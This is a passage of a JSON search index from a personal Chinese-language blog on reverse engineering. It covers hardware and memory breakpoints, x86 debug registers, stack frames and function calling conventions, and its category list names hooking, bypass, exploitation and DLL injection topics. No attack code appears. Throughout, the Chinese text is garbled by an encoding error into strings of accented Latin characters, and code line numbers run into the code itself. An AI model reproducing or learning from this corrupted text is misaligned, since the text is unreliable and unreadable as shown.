ä¸ªè°ƒè¯•å¯„å­˜å™¨ï¼ˆDR0-DR7ï¼‰ï¼Œåˆ†åˆ«ç”¨äºè®¾ç½®å’Œç®¡ç†ç¡¬ä»¶æ–­ç‚¹ã€‚ç¡¬ä»¶æ–­ç‚¹æ¯”è½¯ä»¶æ–­ç‚¹çš„åŠŸèƒ½æ›´å¼ºï¼Œé™¤äº†å‡½æ•°æ–­ç‚¹å¤–ï¼Œè¿˜å¯ä»¥æ•°æ®æ–­ç‚¹ï¼Œå¯ä»¥æŒ‡å®šå½“æ•°æ®è¢«è¯»æˆ–å†™æ—¶ä¸­æ–­ã€‚ç¡¬ä»¶æ–­ç‚¹çš„æœ¬è´¨å°±æ˜¯åœ¨æŒ‡å®šå†…å­˜ä¸‹æ–­ç‚¹ï¼Œå†…å­˜å¯ä»¥ä½äºä»£ç æ®µï¼ˆå‡½æ•°æ–­ç‚¹ï¼‰ä¹Ÿå¯ä»¥æ˜¯æ•°æ®æ®µï¼ˆæ•°æ®æ–­ç‚¹ï¼‰ã€‚å¯ä»¥è®¾ç½®äº‹ä»¶æœ‰æ‰§è¡Œã€å†™å…¥ã€è¯»å†™æ—¶ä¸­æ–­ã€‚ DR0-DR3 è´Ÿè´£å­˜å‚¨ç¡¬ä»¶æ–­ç‚¹çš„å†…å­˜åœ°å€ï¼Œæ‰€ä»¥æœ€å¤šåªèƒ½åŒæ—¶ä½¿ç”¨ 4 ä¸ªç¡¬ä»¶æ–­ç‚¹ã€‚ DR4 å’Œ DR5 ä¿ç•™ä½¿ç”¨ã€‚ DR6 ä¸ºè°ƒè¯•çŠ¶æ€å¯„å­˜å™¨ï¼Œè®°å½•ä¸Šä¸€æ¬¡æ–­ç‚¹è§¦å‘æ‰€äº§ç”Ÿçš„è°ƒè¯•äº‹ä»¶ç±»å‹ä¿¡æ¯ã€‚ DR7 æ˜¯ç¡¬ä»¶æ–­ç‚¹çš„æ¿€æ´»å¼€å…³ï¼Œå­˜å‚¨ç€å„ä¸ªæ–­ç‚¹çš„è§¦å‘ä¿¡æ¯æ¡ä»¶ã€‚ ä¸è½¯æ–­ç‚¹ä¸åŒçš„æ˜¯ï¼Œç¡¬ä»¶æ–­ç‚¹ä½¿ç”¨ 1 å·ä¸­æ–­ï¼ˆINT1ï¼‰å®ç°ï¼ŒINT1 ä¸€èˆ¬è¢«ç”¨äºç¡¬ä»¶æ–­ç‚¹å’Œå•æ­¥äº‹ä»¶ã€‚ CPU æ¯æ¬¡è¯•å›¾æ‰§è¡Œä¸€æ¡æŒ‡ä»¤æ—¶ï¼Œéƒ½ä¼šé¦–å…ˆæ£€æŸ¥å½“å‰æŒ‡ä»¤æ‰€åœ¨åœ°å€æ˜¯å¦è¢«è®¾ç½®äº†æœ‰æ•ˆçš„ç¡¬ä»¶æ–­ç‚¹ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜ä¼šæ£€æŸ¥å½“å‰æŒ‡ä»¤åŒ…å«çš„æ“ä½œæ•°æ˜¯å¦ä½äºè¢«è®¾ç½®äº†ç¡¬ä»¶æ–­ç‚¹çš„å†…å­˜åœ°å€ã€‚ å†…å­˜æ–­ç‚¹å†…å­˜æ–­ç‚¹æœ¬è´¨ä¸Šä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ–­ç‚¹ã€‚å½“è°ƒè¯•å™¨è®¾ç½®ä¸€ä¸ªå†…å­˜æ–­ç‚¹æ—¶ï¼Œå®é™…ä¸Šæ˜¯æ”¹å˜ä¸€ä¸ªå†…å­˜åŒºåŸŸæˆ–ä¸€ä¸ªå†…å­˜é¡µçš„æƒé™ã€‚æ“ä½œç³»ç»Ÿå¯¹å†…å­˜é¡µä¼šè®¾ç½®è®¿é—®æƒé™ï¼Œå¯æ‰§è¡Œã€å¯è¯»ã€å¯å†™ã€ä¿æŠ¤é¡µï¼Œè¿™äº›è®¿é—®æƒé™å¯ä»¥ç»„åˆã€‚ ä¿æŠ¤é¡µçš„ç‰¹æ€§å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°æ–­ç‚¹æœºåˆ¶ã€‚ ä»»ä½•å¯¹äºæœ‰é¡µä¿æŠ¤çš„åŒºåŸŸçš„å†…å­˜è®¿é—®éƒ½ä¼šå¯¼è‡´ CPU æš‚åœæ‰§è¡Œå½“å‰è¿›ç¨‹å¹¶å¤„å‘ä¸€ä¸ªä¿æŠ¤é¡µè°ƒè¯•å¼‚å¸¸ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å¯¹è®¿é—®ç¼“å†²å–å¾—æŒ‡ä»¤ä»£ç è¿›è¡Œä»”ç»†çš„æ£€æŸ¥ï¼Œå¹¶åˆ¤æ–­å‡ºåº”ç”¨ç¨‹åºå¦‚ä½•å¤„ç†ç¼“å†²åŒºä¸­çš„å†…å®¹ã€‚","categories":[{"name":"äºŒè¿›åˆ¶åŸºç¡€","slug":"äºŒè¿›åˆ¶åŸºç¡€","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"æ ˆå¸§","slug":"æ ˆå¸§","date":"2021-09-19T16:00:00.000Z","updated":"2024-05-12T13:21:41.272Z","comments":true,"path":"2021/09/20/æ ˆå¸§/","permalink":"https://e1ectr0nlc.github.io/2021/09/20/%E6%A0%88%E5%B8%A7/","excerpt":"æ ˆä½œä¸ºé‡è¦çš„æ•°æ®ç»“æ„ï¼Œä¸»è¦ç”¨äºç®¡ç†ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­çš„å‡½æ•°è°ƒç”¨å’Œå±€éƒ¨å˜é‡ã€‚å®ƒé€šè¿‡åè¿›å…ˆå‡ºçš„åŸåˆ™å­˜å‚¨å’Œç®¡ç†æ•°æ®ï¼ŒåŒ…æ‹¬å‡½æ•°çš„å‚æ•°ã€è¿”å›åœ°å€ã€å±€éƒ¨å˜é‡ç­‰ã€‚","text":"æ ˆä½œä¸ºé‡è¦çš„æ•°æ®ç»“æ„ï¼Œä¸»è¦ç”¨äºç®¡ç†ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­çš„å‡½æ•°è°ƒç”¨å’Œå±€éƒ¨å˜é‡ã€‚å®ƒé€šè¿‡åè¿›å…ˆå‡ºçš„åŸåˆ™å­˜å‚¨å’Œç®¡ç†æ•°æ®ï¼ŒåŒ…æ‹¬å‡½æ•°çš„å‚æ•°ã€è¿”å›åœ°å€ã€å±€éƒ¨å˜é‡ç­‰ã€‚ é‡è¦æ¦‚å¿µæ ˆæ ˆåœ¨æ•°æ®ç»“æ„ä¸­æ˜¯ä¸€ç§è¿ç®—å—é™çš„çº¿æ€§è¡¨ï¼Œå³æˆ‘ä»¬åªèƒ½å¯¹è¡¨å°¾è¿›è¡Œæ“ä½œï¼Œç§°ä¹‹ä¸ºæ ˆé¡¶ï¼Œç›¸å¯¹çš„ï¼Œå¦ä¸€ç«¯ç§°ä¸ºæ ˆåº•ã€‚å®ƒæŒ‰ç…§å…ˆè¿›åå‡ºçš„åŸåˆ™å­˜å‚¨æ•°æ®ï¼Œå…ˆè¿›å…¥çš„æ•°æ®ä¿å­˜åœ¨æ ˆåº•ï¼Œåæ¥çš„æ•°æ®ä¿å­˜åœ¨æ ˆé¡¶ã€‚æ ˆä¸­çš„æ•°æ®éƒ½æ˜¯ä»¥æ ˆå¸§ï¼ˆStack Frameï¼‰çš„æ ¼å¼å­˜åœ¨ï¼Œæ ˆå¸§æ˜¯ä¸€ä¸ªå†…å­˜åŒºå—ï¼Œå­˜å‚¨äº†å‡½æ•°è°ƒç”¨æ—¶æ‰€éœ€è¦ä½¿ç”¨çš„ä¿¡æ¯ã€‚ EBPæ ˆåº•æŒ‡é’ˆ ESPæ ˆé¡¶æŒ‡é’ˆ callæ±‡ç¼–è¯­è¨€ï¼Œè°ƒç”¨å‡½æ•°æ—¶éœ€è¦ä½¿ç”¨callæ¥è°ƒç”¨ retnå‡½æ•°è°ƒç”¨ç»“æŸåè¿”å›ã€‚å½“retnæŒ‡ä»¤æ‰§è¡Œæ—¶æ˜¯å°†espæŒ‡å‘åœ°å€çš„å€¼å¼¹å‡ºåˆ°EIPå¯„å­˜å™¨ä¸­ï¼Œè¡¨ç¤ºè¿”å›åˆ°è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ å¼€è¾Ÿæ ˆå¸§12345678910;æ ˆå¸§ç»“æ„PUSH EBP ;å‡½æ•°å¼€å§‹ï¼ˆä½¿ç”¨EBPå‰å…ˆæŠŠå·²æœ‰å€¼ä¿å­˜åˆ°æ ˆä¸­ï¼‰MOV EBP, ESP ;ä¿å­˜å½“å‰ESPåˆ°EBPä¸­ï¼ˆä¿å­˜è¿”å›åœ°å€ï¼‰... ;å‡½æ•°ä½“ ;æ— è®ºESPå€¼å¦‚ä½•å˜åŒ–ï¼ŒEBPéƒ½ä¿æŒä¸å˜ï¼Œå¯ä»¥å®‰å…¨è®¿é—®å‡½æ•°çš„å±€éƒ¨å˜é‡ã€å‚æ•°MOV ESP, EBP ;å°†å‡½æ•°çš„èµ·å§‹ï¼ˆè¿”å›ï¼‰åœ°å€ç»™åˆ°ESPPOP EBP ;å‡½æ•°è¿”å›å‰å¼¹å‡ºä¿å­˜åœ¨æ ˆä¸­çš„å€¼RETN ;å‡½æ•°ç»ˆæ­¢ï¼Œè¿”å›åˆ°è°ƒç”¨å‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ å‡½æ•°è°ƒç”¨çº¦å®šåœ¨æ ˆå¸§çš„å¼€è¾Ÿä¸­æ¶‰åŠåˆ°å‡½æ•°çš„è°ƒç”¨ã€‚ä¾‹å¦‚æœ‰ä¸€ä¸ªå‡½æ•° 1int test(int a,int b); ç¼–å†™ä»£ç æ—¶æˆ‘ä»¬è‚¯å®šç†è§£è¿™ä¸ªå‡½æ•°å¦‚ä½•ä¼ å‚ï¼Œä¼ å‡ ä¸ªå‚æ•°ã€‚ä½†æ˜¯CPUæ€ä¹ˆæ‰èƒ½çŸ¥é“è¿™ä¸ªå‡½æ•°æœ‰å‡ ä¸ªå‚æ•°ï¼Œå‚æ•°çš„å€¼æ˜¯ä»€ä¹ˆï¼Œä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œè®¡ç®—æœºæä¾›äº†ä¸€ç§è¢«ç§°ä¸ºæ ˆçš„æ•°æ®ç»“æ„æ¥æ”¯æŒå‚æ•°ä¼ é€’ã€‚ ä½†æ˜¯è¿˜æœ‰é—®é¢˜æ²¡æœ‰è§£å†³ï¼Œå½“å‡½æ•°ä¼ é€’å‚æ•°æ—¶ï¼ŒæŒ‰ç…§ä»€ä¹ˆæ ·çš„é¡ºåºä¼ å‚ï¼Œæ˜¯ä»å·¦åˆ°å³è¿˜æ˜¯ä»å³åˆ°å·¦ï¼Œè°ƒç”¨ç»“æŸåå¦‚ä½•æ¸…é™¤å †æ ˆï¼Œç”±è°ƒç”¨è€…æ¸…é™¤è¿˜æ˜¯è¢«è°ƒç”¨è€…æ¸…é™¤ä»¥åŠå¯„å­˜å™¨å¦‚ä½•ä½¿ç”¨ã€‚è¿™æ—¶å°±æå‡ºäº†å‡½æ•°è°ƒç”¨çº¦å®šæ¥è§£å†³è¿™ä¸ªé—®é¢˜ stdcallå£°æ˜çš„è¯­æ³•ä¸ºï¼š 1int __stdcall function(int a,int b); stdcallçš„è°ƒç”¨çº¦å®šæ„å‘³ç€ï¼š å‚æ•°ä»å³å‘å·¦å‹å…¥å †æ ˆ å‡½æ•°è‡ªèº«æ¸…ç†å †æ ˆ å‡½æ•°åè‡ªåŠ¨åŠ å‰å¯¼çš„ä¸‹åˆ’çº¿ï¼Œåé¢ç´§è·Ÿä¸€ä¸ª@ç¬¦å·ï¼Œå…¶åç´§è·Ÿç€å‚æ•°çš„å°ºå¯¸ cdeclæ˜¯Cå’ŒC++é»˜è®¤çš„è°ƒç”¨çº¦å®š å£°æ˜çš„è¯­æ³•ï¼š 12int function (int a ,int b); //ä¸åŠ ä¿®é¥°å°±æ˜¯Cè°ƒç”¨çº¦å®š int __cdecl function(int a,int b);//æ˜ç¡®æŒ‡å‡ºCè°ƒç”¨çº¦å®š cdeclè°ƒç”¨çº¦å®šæ„å‘³ç€ï¼š å‚æ•°ä»å³å‘å·¦å‹å…¥å †æ ˆ è°ƒç”¨è€…è´Ÿè´£æ¸…ç†å †æ ˆ Cè°ƒç”¨çº¦å®šå…è®¸å‡½æ•°çš„å‚æ•°çš„ä¸ªæ•°æ˜¯ä¸å›ºå®šçš„ï¼Œè¿™ä¹Ÿæ˜¯Cè¯­è¨€çš„ä¸€å¤§ç‰¹è‰²ã€‚ ä»…åœ¨å‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œæ ¼å¼ä¸º_functionnameã€‚ fastcallå£°æ˜è¯­æ³•ï¼š 1int fastcall function(int a,int b); fastcallè°ƒç”¨çº¦å®šæ„å‘³ç€ï¼š å‡½æ•°çš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªDWORDå‚æ•°ï¼ˆæˆ–è€…å°ºå¯¸æ›´å°çš„ï¼‰é€šè¿‡ecxå’Œedxä¼ é€’ï¼Œå…¶ä»–å‚æ•°é€šè¿‡ä»å³å‘å·¦çš„é¡ºåºå‹æ ˆ å‡½æ•°è‡ªèº«æ¸…ç†å †æ ˆ å‡½æ•°åä¿®æ”¹è§„åˆ™åŒstdcall:å‡½æ•°åè‡ªåŠ¨åŠ å‰å¯¼çš„ä¸‹åˆ’çº¿ï¼Œåé¢ç´§è·Ÿä¸€ä¸ª@ç¬¦å·ï¼Œå…¶åç´§è·Ÿç€å‚æ•°çš„å°ºå¯¸ã€‚ thiscallC++ç±»æˆå‘˜å‡½æ•°ç¼ºçœçš„è°ƒç”¨çº¦å®š thiscallæ˜¯å”¯ä¸€ä¸€ä¸ªä¸èƒ½æ˜ç¡®æŒ‡æ˜çš„å‡½æ•°ä¿®é¥°ï¼Œå› ä¸ºthiscallä¸æ˜¯å…³é”®å­—ã€‚ç”±äºæˆå‘˜å‡½æ•°è°ƒç”¨è¿˜æœ‰ä¸€ä¸ªthisæŒ‡é’ˆï¼Œå› æ­¤å¿…é¡»ç‰¹æ®Šå¤„ç†ï¼Œthiscallæ„å‘³ç€: å‚æ•°ä»å³å‘å·¦å…¥æ ˆ å¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼ŒthisæŒ‡é’ˆåœ¨æ‰€æœ‰å‚æ•°å‹æ ˆåè¢«å‹å…¥å †æ ˆã€‚å¦‚æœå‚æ•°ä¸ªæ•°ç¡®å®šï¼ŒthisæŒ‡é’ˆé€šè¿‡ecxä¼ é€’ç»™è¢«è°ƒç”¨è€…ã€‚ å¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼Œè°ƒç”¨è€…æ¸…ç†å †æ ˆï¼Œå¦åˆ™å‡½æ•°è‡ªå·±æ¸…ç†å †æ ˆ å¯¹äºå‚æ•°ä¸ªæ•°å›ºå®šæƒ…å†µä¸‹ï¼Œç±»ä¼¼äºstdcallï¼Œä¸å®šæ—¶åˆ™ç±»ä¼¼cdecl naked callä¸€ä¸ªå¾ˆå°‘è§çš„è°ƒç”¨çº¦å®šï¼Œä¸€èˆ¬ç”¨äºå®æ¨¡å¼é©±åŠ¨ç¨‹åºè®¾è®¡","categories":[{"name":"äºŒè¿›åˆ¶åŸºç¡€","slug":"äºŒè¿›åˆ¶åŸºç¡€","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]}],"categories":[{"name":"Hookæ¡†æ¶","slug":"Hookæ¡†æ¶","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"},{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"},{"name":"æ¼æ´åˆ©ç”¨","slug":"æ¼æ´åˆ©ç”¨","permalink":"https://e1ectr0nlc.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"name":"ä»£ç ä¿æŠ¤","slug":"ä»£ç ä¿æŠ¤","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"},{"name":"Dllæ³¨å…¥","slug":"Dllæ³¨å…¥","permalink":"https://e1ectr0nlc.github.io/categories/Dll%E6%B3%A8%E5%85%A5/"},{"name":"è„šæœ¬å·¥å…·","slug":"è„šæœ¬å·¥å…·","permalink":"https://e1ectr0nlc.github.io/categories/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/"},{"name":"äºŒè¿›åˆ¶åŸºç¡€","slug":"äºŒè¿›åˆ¶åŸºç¡€","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]}